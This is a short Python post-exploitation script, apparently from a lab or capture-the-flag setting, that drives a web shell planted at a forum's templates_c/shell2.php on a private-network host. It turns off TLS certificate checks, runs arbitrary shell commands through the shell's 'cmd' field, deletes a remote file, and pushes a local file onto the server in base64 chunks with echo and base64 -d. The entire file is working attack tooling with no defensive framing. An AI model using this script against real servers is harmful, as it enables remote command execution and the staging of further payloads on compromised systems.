import urllib.request
import urllib.parse
import sys
import base64
import time
import ssl

# Disable SSL verification
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

URL = "https://192.168.64.3/forum/templates_c/shell2.php"

def send_cmd(cmd):
    data = urllib.parse.urlencode({'cmd': cmd}).encode()
    req = urllib.request.Request(URL, data=data)
    try:
        with urllib.request.urlopen(req, context=ctx) as response:
            return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error sending cmd: {e}")
        return None

def upload_file(local_path, remote_path):
    print(f"Uploading {local_path} to {remote_path}...")
    
    # Read the file
    with open(local_path, 'rb') as f:
        content = f.read()

    # Clear remote file first
    print(f"Clearing {remote_path}...")
    send_cmd(f'rm {remote_path}')
    
    # Chunk size
    chunk_size = 500 
    for i in range(0, len(content), chunk_size):
        chunk = content[i:i+chunk_size]
        # Base64 encode the chunk to avoid shell issues
        b64_chunk = base64.b64encode(chunk).decode('utf-8')
        
        # Command: echo -n "base64" | base64 -d >> remote_path
        cmd = f'echo -n "{b64_chunk}" | base64 -d >> {remote_path}'
        
        result = send_cmd(cmd)
        if result is None:
             print(f"Failed to upload chunk {i}")
             return False
            
        sys.stdout.write(f"\rProgress: {i}/{len(content)} bytes")
        sys.stdout.flush()
        
    print(f"\nUpload complete. Verifying size...")
    # Verify size
    result = send_cmd(f'du -b {remote_path}')
    if result:
        print(result.strip())

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 webshell_upload.py <local_path> <remote_path>")
        sys.exit(1)
        
    upload_file(sys.argv[1], sys.argv[2])
